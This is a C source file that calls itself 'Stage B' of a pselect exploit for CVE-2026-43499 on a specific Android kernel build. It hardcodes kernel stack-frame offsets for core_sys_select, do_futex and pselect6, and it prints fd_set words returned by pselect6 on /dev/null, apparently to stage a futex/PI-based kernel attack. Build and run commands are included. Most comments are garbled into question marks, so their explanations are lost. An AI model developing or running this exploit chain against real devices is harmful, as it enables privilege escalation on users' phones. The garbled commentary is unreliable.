/*
 * psel_geom ? CVE-2026-43499 pselect ???????Stage B???????
 * ??: AMP-AN00 / 6.1.99-android14-11-g5859fbdbad8c
 * ??: ?? futex???? PI ?????????
 *
 * ??: $NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android21-clang -O2 -static -o psel_geom psel_geom.c
 * ??: ./psel_geom echo | ./psel_geom stamp
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

/* ????????frame_probe.py ?? build ??? */
#define CS_FRAME   0x1c0
#define STACK_FDS  0x50
#define SHIFT      10
#define DO_FUTEX_F 0x60
#define PSEL6_F    0x90

static void geom(void) {
    printf("[geom] core_sys_select frame=0x%x stack_fds=0x%x shift=%d\n",
           CS_FRAME, STACK_FDS, SHIFT);
    printf("[geom] slots in=0x%x out=0x%x ex=0x%x res_in=0x%x res_out=0x%x res_ex=0x%x\n",
           STACK_FDS, STACK_FDS + 8, STACK_FDS + 16,
           STACK_FDS + 24, STACK_FDS + 32, STACK_FDS + 40);
    printf("[geom] do_futex=0x%x pselect6=0x%x\n", DO_FUTEX_F, PSEL6_F);
}

static int echo_once(void) {
    /* ??? 1/2/3 ?????adb shell ???????????? fd ? select */
    int fd = open("/dev/null", O_RDONLY);
    if (fd < 0) { printf("[echo] open /dev/null failed errno=%d\n", errno); return 0; }
    int nfds = 64;
    fd_set in, out, ex;
    FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
    FD_SET(fd, &in); FD_SET(fd, &out); FD_SET(fd, &ex);
    printf("[echo] using fd=%d\n", fd);
    unsigned char in0[8], out0[8], ex0[8];
    memcpy(in0, &in, 8); memcpy(out0, &out, 8); memcpy(ex0, &ex, 8);

    struct timespec tv = {0, 0};
    long rc = syscall(SYS_pselect6, nfds, &in, &out, &ex, &tv, NULL);
    int e = errno;
    close(fd);

    /* /dev/null ??????? rc=1?in ?????out/ex ????? */
    int ok = (rc >= 1) && FD_ISSET(fd, &in) && !FD_ISSET(fd, &ex);
    printf("[echo] rc=%ld errno=%d ok=%d nfds=%d in=%016llx out=%016llx ex=%016llx\n",
           rc, e, ok, nfds,
           (unsigned long long)*(unsigned long *)&in,
           (unsigned long long)*(unsigned long *)&out,
           (unsigned long long)*(unsigned long *)&ex);
    return ok;
}

/* ??? 6 ? 8 ???? pselect ???????????????? */
static int stamp_once(void) {
    int fd = open("/dev/null", O_RDONLY);
    if (fd < 0) { printf("[stamp] open /dev/null failed errno=%d\n", errno); return 0; }
    int nfds = 64;
    fd_set in, out, ex;
    FD_ZERO(&in); FD_ZERO(&out); FD_ZERO(&ex);
    FD_SET(fd, &in); FD_SET(fd, &out); FD_SET(fd, &ex);
    struct timespec tv = {0, 0};
    long rc = syscall(SYS_pselect6, nfds, &in, &out, &ex, &tv, NULL);
    int e = errno;
    close(fd);
    printf("[stamp] rc=%ld errno=%d\n", rc, e);
    printf("[stamp] word10=%016llx word11=%016llx word12=%016llx (user echo only)\n",
           (unsigned long long)*(unsigned long *)&in,
           (unsigned long long)*(unsigned long *)&out,
           (unsigned long long)*(unsigned long *)&ex);
    return 0;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    geom();
    if (argc > 1 && strcmp(argv[1], "stamp") == 0)
        return stamp_once();
    return echo_once() ? 0 : 1;
}


